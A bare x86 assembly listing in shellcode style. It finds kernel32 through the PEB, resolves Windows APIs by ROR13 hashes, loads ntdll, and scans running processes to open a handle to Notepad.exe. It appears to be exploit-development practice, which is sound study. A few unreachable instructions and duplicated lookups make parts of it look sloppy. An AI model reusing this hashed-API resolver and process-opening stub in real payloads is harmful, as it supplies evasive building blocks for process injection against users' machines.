start:
       mov ebp, esp
       sub esp, 0x63c
   find_kernel32:                       
       xor ecx,ecx                     
       mov esi,fs:[ecx+30h]            
       mov esi,[esi+0Ch]               
       mov esi,[esi+1Ch]               
   next_module:                         
       mov ebx, [esi+8h]               
       mov edi, [esi+20h]              
       mov esi, [esi]                  
       cmp [edi+12*2], cx              
       jne next_module                 
   find_function_shorten:               
       jmp find_function_shorten_bnc   
   find_function_ret:                   
       pop esi                         
       mov [ebp+0x04], esi             
       jmp resolve_symbols_kernel32    
   find_function_shorten_bnc:           
       call find_function_ret          
   find_function:                       
       pushad                          
       mov eax, [ebx+0x3c]             
       mov edi, [ebx+eax+0x78]         
       add edi, ebx                    
       mov ecx, [edi+0x18]             
       mov eax, [edi+0x20]             
       add eax, ebx                    
       mov [ebp-4], eax                
   find_function_loop:                  
       jecxz find_function_finished    
       dec ecx                         
       mov eax, [ebp-4]                
       mov esi, [eax+ecx*4]            
       add esi, ebx                    
   compute_hash:                        
       xor eax, eax                    
       cdq                             
       cld                             
   compute_hash_again:                  
       lodsb                           
       test al, al                     
       jz compute_hash_finished        
       ror edx, 0x0d                   
       add edx, eax                    
       jmp compute_hash_again          
   compute_hash_finished:               
   find_function_compare:               
       cmp edx, [esp+0x24]             
       jnz find_function_loop          
       mov edx, [edi+0x24]             
       add edx, ebx                    
       mov cx, [edx+2*ecx]             
       mov edx, [edi+0x1c]             
       add edx, ebx                    
       mov eax, [edx+4*ecx]            
       add eax, ebx                    
       mov [esp+0x1c], eax             
   find_function_finished:              
       popad                           
       ret                             
   resolve_symbols_kernel32:            
       push 0x78b5b983
       call dword ptr [ebp+0x04]       
       mov [ebp+0x10], eax             
       push 0xec0e4e8e
       call dword ptr [ebp+0x04]       
       mov [ebp+0x14], eax             
       push 0x16b3fe72
       call dword ptr [ebp+0x04]
       mov [ebp+0x20], eax
       push 0xe454dfed
       call dword ptr [ebp+0x04]
       mov [ebp+0x24], eax
       push 0x3249baa7
       call dword ptr [ebp+0x04]
       mov [ebp+0x28], eax
       push 0x4776654a
       call dword ptr [ebp+0x04]
       mov [ebp+0x2c], eax
       push 0xefe297c0
       call dword ptr [ebp+0x04]
       mov [ebp+0x30], eax
       push 0x0006c
       push 0x6c642e6c
       push 0x6c64746e
       push esp
       call dword ptr [ebp+0x14]
       mov ebx, eax
       push 0x77c93c6
       call dword ptr [ebp+0x04]
       mov [ebp+0x34], eax
       push 0x3e192526
       call dword ptr [ebp+0x04]
       mov [ebp+0x38], eax
       push 0x77c93c6
       call dword ptr [ebp+0x04]
       mov [ebp+0x3c], eax
       push 0x3e192526
       call dword ptr [ebp+0x04]
       mov [ebp+0x40], eax
       mov esi, ebp
       jmp main
   strlen:
       push ebp
       mov ebp, esp
       sub esp, 0x8
       mov dword ptr [ebp-0x4], 0x0
       mov eax, [ebp+0x8]
       mov ebx, [ebp-0x4]
       add eax, ebx
       mov al, byte ptr[eax]
       movzx eax, al
       mov dword ptr [ebp-0x8], eax
   while_stmt1:
       mov eax, [ebp-0x8]
       cmp eax, 0x0
       jle while_stmt1_end
       mov eax, [ebp-0x4]
       add eax, 1
       mov dword ptr [ebp-0x4], eax
       mov eax, [ebp+0x8]
       mov ebx, [ebp-0x4]
       add eax, ebx
       mov al, byte ptr[eax]
       movzx eax, al
       mov dword ptr [ebp-0x8], eax
       jmp while_stmt1
   while_stmt1_end:
       mov eax, [ebp-0x4]
       mov esp, ebp
       pop ebp
       ret
add esp, 0x4
   strcmp:
       push ebp
       mov ebp, esp
       sub esp, 0x14
       mov eax, [ebp+0x8]
       push eax
       call strlen
       mov dword ptr [ebp-0x4], eax
       mov eax, [ebp+0xc]
       push eax
       call strlen
       mov dword ptr [ebp-0x8], eax
       mov dword ptr [ebp-0xc], 0x0
       mov eax, [ebp-0x4]
       mov ebx, [ebp-0x8]
       cmp eax, ebx
       je if_stmt1
       mov eax, 0
       mov esp, ebp
       pop ebp
       ret
   if_stmt1:
   while_stmt2:
       mov eax, [ebp-0xc]
       mov ebx, [ebp-0x4]
       cmp eax, ebx
       jg while_stmt2_end
       mov eax, [ebp+0x8]
       mov ebx, [ebp-0xc]
       add eax, ebx
       mov al, byte ptr[eax]
       movzx eax, al
       mov dword ptr [ebp-0x10], eax
       mov eax, [ebp+0xc]
       mov ebx, [ebp-0xc]
       add eax, ebx
       mov al, byte ptr[eax]
       movzx eax, al
       mov dword ptr [ebp-0x14], eax
       mov eax, [ebp-0x10]
       mov ebx, [ebp-0x14]
       cmp eax, ebx
       je if_stmt2
       mov eax, 0
       mov esp, ebp
       pop ebp
       ret
   if_stmt2:
       mov eax, [ebp-0xc]
       add eax, 1
       mov dword ptr [ebp-0xc], eax
       jmp while_stmt2
   while_stmt2_end:
       mov eax, 1
       mov esp, ebp
       pop ebp
       ret
add esp, 0x8
   OpenProcessByName:
       push ebp
       mov ebp, esp
       sub esp, 0x20
       push 0x0
       push 0x2
       call dword ptr [esi+0x24]
       mov dword ptr [ebp-0x4], eax
       push 0x0
       push 0x0
       push 0x0
       push 0x0
       push 0x0
       push 0x2
       call dword ptr [esi+0x3c]
       mov dword ptr [ebp-0x8], eax
       mov eax, [ebp-0x8]
       push 0x190
       push 0x8
       push eax
       call dword ptr [esi+0x40]
       mov dword ptr [ebp-0xc], eax
       mov dword ptr [ebp-0x10], 0x0
   while_stmt7:
       mov eax, [ebp-0x10]
       cmp eax, 0x190
       jge while_stmt7_end
       mov eax, [ebp-0xc]
       mov ebx, [ebp-0x10]
       add eax, ebx
       mov dword ptr [eax], 0x0
       mov eax, [ebp-0x10]
       add eax, 1
       mov dword ptr [ebp-0x10], eax
       jmp while_stmt7
   while_stmt7_end:
       mov eax, [ebp-0xc]
       add eax, 0
       mov dword ptr [eax], 0x128
       mov eax, [ebp-0x4]
       mov ebx, [ebp-0xc]
       push ebx
       push eax
       call dword ptr [esi+0x28]
       mov eax, [ebp-0xc]
       add eax, 36
       mov dword ptr [ebp-0x14], eax
       mov eax, [ebp+0x8]
       mov ebx, [ebp-0x14]
       push ebx
       push eax
       call strcmp
       mov dword ptr [ebp-0x18], eax
   while_stmt8:
       mov eax, [ebp-0x18]
       cmp eax, 0x1
       je while_stmt8_end
       mov eax, [ebp-0x4]
       mov ebx, [ebp-0xc]
       push ebx
       push eax
       call dword ptr [esi+0x2c]
       mov eax, [ebp-0xc]
       add eax, 36
       mov dword ptr [ebp-0x14], eax
       mov eax, [ebp+0x8]
       mov ebx, [ebp-0x14]
       push ebx
       push eax
       call strcmp
       mov dword ptr [ebp-0x18], eax
       jmp while_stmt8
   while_stmt8_end:
       mov eax, [ebp-0xc]
       add eax, 8
       mov eax, dword ptr[eax]
       mov dword ptr [ebp-0x1c], eax
       mov eax, [ebp-0x1c]
       push eax
       push 0x1
       push 0x20
       call dword ptr [esi+0x30]
       mov dword ptr [ebp-0x20], eax
       mov eax, [ebp-0x1c]
       mov esp, ebp
       pop ebp
       ret
add esp, 0x4
   main:
       push ebp
       mov ebp, esp
       sub esp, 0x8
       push 0x0657865
       push 0x2e646170
       push 0x65746f4e
       mov [ebp-0x4], esp
       mov eax, [ebp-0x4]
       push eax
       call OpenProcessByName
       mov dword ptr [ebp-0x8], eax
       mov eax, 1
       mov esp, ebp
       pop ebp
       ret